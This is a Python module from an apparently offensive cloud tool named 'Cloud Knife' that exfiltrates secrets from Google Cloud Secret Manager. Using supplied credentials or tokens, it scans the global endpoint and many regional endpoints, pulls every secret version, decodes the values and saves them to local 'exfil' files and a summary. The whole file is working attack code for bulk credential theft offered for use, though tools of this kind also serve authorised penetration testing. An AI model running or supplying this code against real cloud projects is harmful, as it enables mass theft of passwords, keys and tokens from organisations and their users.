"""
GCP Secret Manager Exfiltration for Cloud Knife.

Extracts secret values from Secret Manager API.
Automatically decodes base64 encoded values.

Supports authentication via:
- Service Account JSON key file
- Application Default Credentials (ADC)
- Raw access token (via REST API)
"""

import base64
import json
import os
from pathlib import Path
from typing import List, Dict, Any, Optional, TYPE_CHECKING

import requests
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

if TYPE_CHECKING:
    from src.clouds.gcp.gcp_session import GCPSessionManager

console = Console()

# Secret Manager API base URLs
SECRET_API_BASE = "https://secretmanager.googleapis.com/v1"

# Common GCP regions to check for regional secrets
GCP_REGIONS = [
    "us-central1", "us-east1", "us-east4", "us-west1", "us-west2", "us-west3", "us-west4",
    "europe-west1", "europe-west2", "europe-west3", "europe-west4", "europe-west6",
    "europe-north1", "europe-central2",
    "asia-east1", "asia-east2", "asia-northeast1", "asia-northeast2", "asia-northeast3",
    "asia-south1", "asia-southeast1", "asia-southeast2",
    "australia-southeast1", "australia-southeast2",
    "southamerica-east1", "southamerica-west1",
    "northamerica-northeast1", "northamerica-northeast2",
]


def exfil_secrets(
    session_mgr: "GCPSessionManager",
    project_id: Optional[str] = None,
    output_dir: Optional[str] = None,
    include_disabled: bool = False,
) -> Dict[str, Any]:
    """
    Extract all secret values from Secret Manager.

    Args:
        session_mgr: GCP session manager with valid credentials
        project_id: Project ID to exfiltrate (defaults to current project)
        output_dir: Directory to save extracted values (default: ./exfil/gcp/secrets/)
        include_disabled: Whether to include disabled versions

    Returns:
        Dictionary with exfiltration results
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured. Use 'set_credentials' first.[/red]")
        return {"success": False, "error": "No credentials"}

    # Determine project
    if not project_id:
        default_project = session_mgr.current_session_data.get("project_id")
        if default_project:
            project_id = Prompt.ask(
                "[cyan]Project ID[/cyan]",
                default=default_project,
            )
        else:
            project_id = Prompt.ask("[cyan]Project ID[/cyan]")

    if not project_id:
        console.print("[red]Project ID is required.[/red]")
        return {"success": False, "error": "Project ID required"}

    # Determine output directory
    if not output_dir:
        output_dir = str(Path("./exfil/gcp/secrets") / project_id)

    Path(output_dir).mkdir(parents=True, exist_ok=True)

    console.print(f"[bold]Exfiltrating secrets from project: {project_id}[/bold]")
    console.print(f"[dim]Output directory: {output_dir}[/dim]")

    # Get auth headers
    auth_method = session_mgr.current_session_data.get("auth_method")

    if auth_method == "access_token":
        token = session_mgr.current_session_data.get("access_token")
    else:
        from google.auth.transport.requests import Request
        credentials.refresh(Request())
        token = credentials.token

    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return {"success": False, "error": "No token"}

    headers = {"Authorization": f"Bearer {token}"}

    # First, list all secrets (global + regional endpoints)
    console.print("\n[dim]Listing secrets from all endpoints...[/dim]")
    secrets = _list_all_secrets(headers, project_id)

    if not secrets:
        console.print("[yellow]No secrets found.[/yellow]")
        return {"success": True, "extracted": 0, "failed": 0}

    console.print(f"[dim]Found {len(secrets)} secrets[/dim]")

    # Extract values
    extracted = 0
    failed = 0
    results: List[Dict[str, Any]] = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("Extracting...", total=len(secrets))

        for secret in secrets:
            secret_name = secret["name"]
            full_name = secret["full_name"]
            location = secret.get("location", "global")

            # Get versions (pass location for regional endpoint)
            versions = _get_secret_versions(headers, full_name, include_disabled, location if location != "global" else None)

            # Fallback: if no versions found, try "latest" directly (like exfil_single_secret does)
            if not versions:
                console.print(f"[yellow]⚠️  No versions found for '{secret_name}', trying 'latest'...[/yellow]")
                # Create a synthetic version entry for "latest"
                versions = [{
                    "version_id": "latest",
                    "full_name": f"{full_name}/versions/latest",
                    "state": "ENABLED",
                }]

            secret_result = {
                "name": secret_name,
                "versions": [],
            }

            for version in versions:
                version_id = version["version_id"]
                version_full_name = version["full_name"]

                # Access (fetch) the value (pass location for regional endpoint)
                value, was_base64 = _access_secret_version(headers, version_full_name, location if location != "global" else None)

                if value is not None:
                    version_result = {
                        "version": version_id,
                        "value": value,
                        "was_base64": was_base64,
                        "state": version.get("state", "ENABLED"),
                    }
                    secret_result["versions"].append(version_result)
                    extracted += 1
                else:
                    failed += 1

            if secret_result["versions"]:
                results.append(secret_result)

                # Save to file
                _save_secret_to_file(output_dir, secret_name, secret_result)

            progress.advance(task)

    # Display results
    _display_exfil_results(results)

    # Save summary
    summary = {
        "project": project_id,
        "total_secrets": len(secrets),
        "extracted_versions": extracted,
        "failed": failed,
        "output_dir": output_dir,
        "secrets": results,
    }

    summary_file = os.path.join(output_dir, "_summary.json")
    with open(summary_file, "w") as f:
        json.dump(summary, f, indent=2, default=str)

    console.print(f"\n[bold green]Exfiltration complete![/bold green]")
    console.print(f"  [green]Extracted:[/green] {extracted} version(s)")
    console.print(f"  [red]Failed:[/red] {failed}")
    console.print(f"  [dim]Output:[/dim] {output_dir}")
    console.print(f"  [dim]Summary:[/dim] {summary_file}")

    # Save to session
    session_mgr.save_enumeration_data(f"exfil_secrets_{project_id}", summary)

    return summary


def _list_all_secrets(
    headers: Dict[str, str],
    project_id: str,
) -> List[Dict[str, Any]]:
    """List all secrets in a project (global + all regional endpoints)."""
    all_secrets: List[Dict[str, Any]] = []

    # Query global endpoint
    console.print("[dim]  Scanning global endpoint...[/dim]")
    global_secrets = _list_secrets_from_endpoint(headers, project_id, location=None)
    all_secrets.extend(global_secrets)

    # Query regional endpoints
    console.print(f"[dim]  Scanning {len(GCP_REGIONS)} regional endpoints...[/dim]")
    for region in GCP_REGIONS:
        regional_secrets = _list_secrets_from_endpoint(headers, project_id, location=region)
        all_secrets.extend(regional_secrets)

    return all_secrets


def _list_secrets_from_endpoint(
    headers: Dict[str, str],
    project_id: str,
    location: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """List secrets from a specific endpoint (global or regional)."""
    secrets: List[Dict[str, Any]] = []

    # Build URL based on location
    if location:
        # Regional endpoint
        base_url = f"https://secretmanager.{location}.rep.googleapis.com/v1"
        url = f"{base_url}/projects/{project_id}/locations/{location}/secrets"
    else:
        # Global endpoint
        url = f"{SECRET_API_BASE}/projects/{project_id}/secrets"

    page_token = None

    while True:
        params = {"pageSize": 100}
        if page_token:
            params["pageToken"] = page_token

        try:
            response = requests.get(url, headers=headers, params=params, timeout=30)

            if response.status_code == 404:
                # Expected for regions without secrets
                return []
            elif response.status_code == 403:
                # Expected for regions without access
                return []
            elif response.status_code != 200:
                # Only log for global endpoint
                if not location:
                    console.print(f"[yellow]⚠️  Failed to list secrets: HTTP {response.status_code}[/yellow]")
                    console.print(f"[dim]Response: {response.text[:200]}[/dim]")
                return []

            data = response.json()
            items = data.get("secrets", [])

            for item in items:
                # Global format: projects/{project}/secrets/{secret_id}
                # Regional format: projects/{project}/locations/{location}/secrets/{secret_id}
                full_name = item.get("name", "")
                name_parts = full_name.split("/")
                secret_name = name_parts[-1] if name_parts else "unknown"

                # Extract location from full_name
                secret_location = location if location else "global"
                if "locations" in name_parts:
                    location_idx = name_parts.index("locations")
                    if location_idx + 1 < len(name_parts):
                        secret_location = name_parts[location_idx + 1]

                secrets.append({
                    "name": secret_name,
                    "full_name": full_name,
                    "location": secret_location,
                })

            # Log found secrets
            if len(items) > 0:
                location_str = f" in {location}" if location else " (global)"
                console.print(f"[dim]    Found {len(items)} secret(s){location_str}[/dim]")

            page_token = data.get("nextPageToken")
            if not page_token:
                break

        except Exception as e:
            # Only log for global endpoint
            if not location:
                console.print(f"[yellow]⚠️  Exception listing secrets: {str(e)}[/yellow]")
            return []

    return secrets


def _get_secret_versions(
    headers: Dict[str, str],
    secret_full_name: str,
    include_disabled: bool,
    location: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """Get versions for a secret."""
    versions: List[Dict[str, Any]] = []

    # Build URL based on location
    if location:
        # Regional endpoint
        base_url = f"https://secretmanager.{location}.rep.googleapis.com/v1"
        url = f"{base_url}/{secret_full_name}/versions"
    else:
        # Global endpoint
        url = f"{SECRET_API_BASE}/{secret_full_name}/versions"

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code != 200:
            # Log error for debugging
            secret_name = secret_full_name.split("/")[-1]
            console.print(f"[dim]⚠️  API error for {secret_name}: HTTP {response.status_code}[/dim]")
            return []

        data = response.json()
        items = data.get("versions", [])

        for item in items:
            state = item.get("state", "ENABLED")

            # Always skip DESTROYED versions (value is gone)
            if state == "DESTROYED":
                continue

            # Skip DISABLED unless requested
            if state == "DISABLED" and not include_disabled:
                continue

            name_parts = item.get("name", "").split("/")
            version_id = name_parts[-1] if name_parts else "unknown"

            versions.append({
                "version_id": version_id,
                "full_name": item.get("name"),
                "state": state,
            })

    except Exception as e:
        # Log exception for debugging
        secret_name = secret_full_name.split("/")[-1]
        console.print(f"[dim]⚠️  Exception for {secret_name}: {str(e)[:50]}[/dim]")

    return versions


def _access_secret_version(
    headers: Dict[str, str],
    version_full_name: str,
    location: Optional[str] = None,
) -> tuple[Optional[str], bool]:
    """
    Access (fetch) the value of a secret version.

    Args:
        headers: Authorization headers
        version_full_name: Full version name (projects/.../secrets/.../versions/...)
        location: GCP region if this is a regional secret

    Returns:
        Tuple of (value, was_base64_encoded)
    """
    # Build URL based on location
    if location:
        # Regional endpoint
        base_url = f"https://secretmanager.{location}.rep.googleapis.com/v1"
        url = f"{base_url}/{version_full_name}:access"
    else:
        # Global endpoint
        url = f"{SECRET_API_BASE}/{version_full_name}:access"

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code != 200:
            return None, False

        data = response.json()

        # Secret Manager :access endpoint always returns payload.data as base64
        payload = data.get("payload", {})
        if isinstance(payload, dict) and "data" in payload:
            raw_data = payload["data"]
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8")
                return decoded, True
            except UnicodeDecodeError:
                # Binary data - decode as latin-1 fallback
                decoded = base64.b64decode(raw_data).decode("latin-1")
                return decoded, True
            except Exception:
                return raw_data, False

        # Fallback: return the whole response as JSON for debugging
        return json.dumps(data, indent=2), False

    except Exception:
        return None, False


def _save_secret_to_file(
    output_dir: str,
    secret_name: str,
    secret_result: Dict[str, Any],
) -> None:
    """Save secret to file."""
    # Secrets are project-global (no location subdirectory)
    for version in secret_result.get("versions", []):
        version_id = version["version"]
        value = version["value"]

        # Determine filename
        if len(secret_result["versions"]) == 1:
            filename = f"{secret_name}.txt"
        else:
            filename = f"{secret_name}_v{version_id}.txt"

        filepath = os.path.join(output_dir, filename)

        with open(filepath, "w") as f:
            f.write(value)


def _display_exfil_results(results: List[Dict[str, Any]]) -> None:
    """Display extracted secrets."""
    if not results:
        return

    console.print("\n[bold]Extracted Secrets:[/bold]\n")

    table = Table(show_header=True, expand=True)
    table.add_column("Secret", style="green", no_wrap=False)
    table.add_column("Versions", style="cyan", justify="right")
    table.add_column("Value Preview", no_wrap=False)

    for secret in results[:20]:  # Limit display
        name = secret["name"]
        versions = secret.get("versions", [])
        version_count = len(versions)

        # Get latest version value preview
        if versions:
            latest_value = versions[0]["value"]
            # Truncate for display
            if len(latest_value) > 60:
                preview = latest_value[:57] + "..."
            else:
                preview = latest_value

            # Mask potential secrets
            if _looks_like_secret(name, latest_value):
                preview = f"[yellow]{preview[:20]}...[MASKED][/yellow]"
        else:
            preview = "-"

        table.add_row(name, str(version_count), preview)

    console.print(table)

    if len(results) > 20:
        console.print(f"\n[dim]... and {len(results) - 20} more secrets[/dim]")


def _looks_like_secret(name: str, value: str) -> bool:
    """Check if a secret looks like it contains sensitive data."""
    secret_indicators = [
        "password", "secret", "key", "token", "credential",
        "api_key", "apikey", "private", "auth",
    ]

    name_lower = name.lower()
    for indicator in secret_indicators:
        if indicator in name_lower:
            return True

    # Check value patterns (starts with common secret prefixes)
    if value.startswith(("sk-", "pk-", "api-", "token-", "Bearer ")):
        return True

    return False


def exfil_single_secret(
    session_mgr: "GCPSessionManager",
    secret_name: str,
    project_id: Optional[str] = None,
    version: str = "latest",
    location: Optional[str] = None,
) -> Optional[str]:
    """
    Extract a single secret value.

    Args:
        session_mgr: GCP session manager with valid credentials
        secret_name: Name of the secret
        project_id: Project ID (defaults to current project)
        version: Version to fetch (default: latest)
        location: GCP region for regional secrets (None for global)

    Returns:
        Secret value or None on failure
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured.[/red]")
        return None

    if not project_id:
        project_id = session_mgr.current_session_data.get("project_id")

    if not project_id:
        console.print("[red]Project ID is required.[/red]")
        return None

    # Get auth headers
    auth_method = session_mgr.current_session_data.get("auth_method")

    if auth_method == "access_token":
        token = session_mgr.current_session_data.get("access_token")
    else:
        from google.auth.transport.requests import Request
        credentials.refresh(Request())
        token = credentials.token

    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    headers = {"Authorization": f"Bearer {token}"}

    # Build version full name based on location
    if location:
        # Regional secret
        version_full_name = f"projects/{project_id}/locations/{location}/secrets/{secret_name}/versions/{version}"
    else:
        # Global secret (Secret Manager supports "latest" natively as a version alias)
        version_full_name = f"projects/{project_id}/secrets/{secret_name}/versions/{version}"

    # Access the value (pass location for regional endpoint)
    value, was_base64 = _access_secret_version(headers, version_full_name, location)

    if value is not None:
        console.print(f"[green]Secret:[/green] {secret_name}")
        if location:
            console.print(f"[dim]Location:[/dim] {location}")
        console.print(f"[dim]Version:[/dim] {version}")
        console.print(f"[dim]Base64 decoded:[/dim] {'Yes' if was_base64 else 'No'}")
        console.print(f"\n[bold]Value:[/bold]")
        console.print(value)
        return value
    else:
        location_str = f" in {location}" if location else ""
        console.print(f"[red]Failed to fetch secret '{secret_name}' version '{version}'{location_str}[/red]")
        return None
